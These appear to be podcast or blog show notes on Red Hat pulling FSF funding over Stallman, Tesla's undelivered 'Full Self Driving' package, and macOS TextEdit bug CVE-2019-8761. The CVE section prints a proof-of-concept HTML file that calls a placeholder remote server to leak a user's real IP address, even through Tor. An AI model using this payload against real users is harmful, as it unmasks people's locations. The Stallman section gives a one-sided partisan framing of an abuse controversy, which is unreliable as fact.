Red Hat joins the fraternity of woke companies
    https://www.theregister.com/2021/03/26/redhat_fsf_funding_richard_stallman/
    Suspended funding the FSF after Stallman's reinstatement
    "I am really outraged by FSF's decision to reinstate RMS at a moment in time where diversity and inclusion awareness is growing"
        - Chris Wright, CTO of Red hat
    Stallman's only crime was pushing back against cancel culture
        defending Marvin Minsky, another professor at MIT
    "The most plausible scenario is that she presented herself to him as entirely willing. Assuming she was being 
        coerced by Epstein, he would have had every reason to tell her to conceal that from most of his associates.
        I’ve concluded from various examples of accusation inflation that it is absolutely wrong to use the term
        'sexual assault' in an accusation."

Tesla in trouble if they can't deliver "Full Self-driving"

    complaints on /r/teslamotors
    Tesla charged $10k extra when buying a car for the "Full Self Driving" package (FSD)
        Ford PR Rep Mike Levine described FSD as "vaporware"
    OP is not just concerned about the $10k they spent, 
        but for legal liability to the company if they can't deliver
    Tesla sold full autonomy
        https://www.tesla.com/autopilot
        "The system is designed to be able to conduct short and long distance trips with no action required by the person in the driver’s seat."
        "All you will need to do is get in and tell your car where to go. If you don’t say anything, the car will look 
            at your calendar and take you there as the assumed destination or just home if nothing is on the calendar."
        "When you arrive at your destination, simply step out at the entrance and your car will enter park seek mode, 
            automatically search for a spot and park itself. A tap on your phone summons it back to you."
        "As these self-driving capabilities are introduced, your car will be continuously upgraded through over-the-air software updates."
    Jalopnik sums it up
        "This thread reads like a lot of intelligent people with disposable income who want to see autonomous vehicles 
            come to market, and who made a hopeful, expensive decision to trust in what they were told was coming. Now they’re not so sure."
    Tesla loves to sell unicorns and rainbows and other things they can't deliver
        modern snake-oil.  And people with more money than sense are buying

    CVE-2019-8761 - fixed in macos Catalina 10.15.1
    TextEdit app in OSX tries to "interpret" an HTML file you open
        Opening txt file with magic bytes makes it try to parse html
            <!DOCTYPE HTML><html><head></head><body>
    Apple Gatekeeper doesn't quarantite files with extension TXT from untrusted sites
    TextEdit will try to load CSS files
        but only local file://
        but OSX has an automount feature that creates file links to remote servers
            and AutoMount uses kernel calls, which skips VPNs and proxies
            leaking real IP address, even through TOR
    Attacking file
        <!DOCTYPE HTML>
        <html><head></head><body><style>@import{ "file:///net/MYSERVER.COM/a.css"} </style>
        I know where you are...</body></html>
    using <iframedoc> it can even load local files
